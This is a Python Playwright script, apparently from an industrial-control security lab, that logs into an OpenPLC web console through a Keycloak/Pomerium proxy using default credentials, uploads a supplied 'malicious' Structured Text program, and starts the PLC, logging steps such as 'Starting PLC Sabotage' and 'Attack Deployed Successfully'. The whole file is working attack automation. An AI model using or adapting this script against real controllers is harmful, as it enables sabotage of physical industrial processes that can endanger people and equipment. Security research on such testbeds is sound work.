import sys
import time
from datetime import datetime, timedelta
from playwright.sync_api import sync_playwright

def log_time(step_name):
    # Use UTC+3 for consistency with host logs (Athens time)
    # Since the container is likely in UTC, we add 3 hours
    now = datetime.now() + timedelta(hours=3)
    now_str = now.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    print(f"[*] Step: {step_name}")
    print(f"  [TIME] {now_str}")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 playwright_attack.py <path_to_st_file>")
        sys.exit(1)
        
    st_file_path = sys.argv[1]
    
    with sync_playwright() as p:
        log_time("Launching Chromium browser")
        try:
            browser = p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-setuid-sandbox"])
        except Exception as e:
            print(f"[-] Failed to launch Chromium: {e}")
            sys.exit(1)
        
        context = browser.new_context(ignore_https_errors=True)
        context.set_default_timeout(90000) 
        page = context.new_page()

        log_time("Navigating to PLC via Zero-Trust Proxy")
        page.goto("https://plc.localhost.pomerium.io/")
        
        for i in range(15): 
            time.sleep(2)
            if "keycloak" in page.url:
                log_time("Logging into Identity Provider (Keycloak)")
                page.wait_for_selector("input[name='username']", timeout=10000)
                page.fill("input[name='username']", "admin")
                page.fill("input[name='password']", "admin")
                page.click("#kc-login")
                time.sleep(5)
                continue
                
            if "authenticate" in page.url:
                try: page.click("text=Sign in", timeout=5000)
                except: pass
                continue
                
            if "login" in page.url and "pomerium" not in page.url:
                log_time("Logging into OpenPLC Console")
                page.wait_for_selector("input[name='username']", timeout=30000)
                page.fill("input[name='username']", "openplc")
                page.fill("input[name='password']", "openplc")
                page.keyboard.press("Enter")
                time.sleep(5)
                continue
                
            if "dashboard" in page.url or "programs" in page.url:
                break
        
        log_time("Navigating to Programs")
        page.goto("https://plc.localhost.pomerium.io/programs", wait_until="domcontentloaded")
        time.sleep(2)
        
        log_time("Uploading Malicious Code")
        try:
            page.wait_for_selector("input[type='file']", timeout=15000)
            page.set_input_files("input[type='file']", st_file_path)
            # Find the submit button or press enter
            page.click("button[type='submit']")
            time.sleep(5)
        except Exception as e:
            print(f"[-] Wait for file input failed: {e}")
            page.screenshot(path="/home/engineer/timeout.png")
            print("[-] Saved screenshot to /home/engineer/timeout.png")
            browser.close()
            sys.exit(1)
            
        log_time("Starting PLC Sabotage")
        page.goto("https://plc.localhost.pomerium.io/start_plc", wait_until="domcontentloaded")
        
        log_time("Attack Deployed Successfully")
        time.sleep(3)
        browser.close()

if __name__ == "__main__":
    main()
